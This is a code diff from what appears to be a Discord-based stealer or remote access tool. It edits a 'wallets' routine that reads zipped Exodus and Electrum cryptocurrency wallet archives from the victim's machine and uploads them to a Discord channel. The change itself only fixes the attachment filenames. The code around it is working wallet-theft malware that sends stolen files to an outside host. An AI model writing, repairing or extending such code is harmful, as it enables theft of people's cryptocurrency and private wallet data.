@@ -122,7 +122,7 @@ async def wallets(channel):
 
         try:
             with open("Exodus.zip", "rb") as wallet:
-                wallet_zip = discord.File(wallet, filename=os.path.basename(file))
+                wallet_zip = discord.File(wallet, filename="Exodus.zip")
                 await channel.send(file=wallet_zip)
         except:
             embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
@@ -145,7 +145,7 @@ async def wallets(channel):
 
         try:
             with open("Electrum.zip", "rb") as wallet:
-                wallet_zip = discord.File(wallet, filename=os.path.basename(file))
+                wallet_zip = discord.File(wallet, filename="Electrum.zip")
                 await channel.send(file=wallet_zip)
         except:
             embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
